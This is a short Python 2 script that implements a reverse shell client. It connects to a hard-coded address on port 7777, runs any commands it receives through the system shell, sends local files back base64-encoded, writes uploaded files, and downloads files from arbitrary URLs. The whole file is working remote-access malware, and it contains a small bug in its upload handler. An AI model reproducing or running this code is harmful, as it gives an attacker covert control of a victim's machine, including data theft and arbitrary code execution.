#!/usr/bin/python2
#_*_ coding: utf8 _*_

import socket
import os
import subprocess
import base64
import requests

def downloadFile(url):
    consulta = requests.get(url)
    name_file = url.split("/")[-1]
    with open(name_file,'wb') as file_get:
        file_get.write(consulta.content)

def shell():
    current_dir=os.getcwd()
    host.send(current_dir)
    while True:
        res = host.recv(40960)
        if res == "exit":
            break
        elif res[:2] == "cd" and len(res) > 2: 
            os.chdir(res[3:])
            result=os.getcwd()
            host.send(result)
        elif res[:8] == "download":
            with open(res[9:],'rb') as file_download:
                host.send(base64.b64encode(file_download.read()))
        elif res[:6] == "upload":
            with open(res[:7],'wb') as file_upload:
                datos = host.recv(40960)
                file_upload.write(base64.b64decode(datos)) 
        elif res[:3] == "get":
            try:
                downloadFile(res[4:])
                host.send("File downloaded succesfully")
            except:
                host.send("Download error has ocurred...")   
        else:
            proc=subprocess.Popen(res,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            if len(result) == 0:
                host.send("1")
            else:
                host.send(result)

host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host.connect(('192.168.0.8',7777))
shell()
host.close()

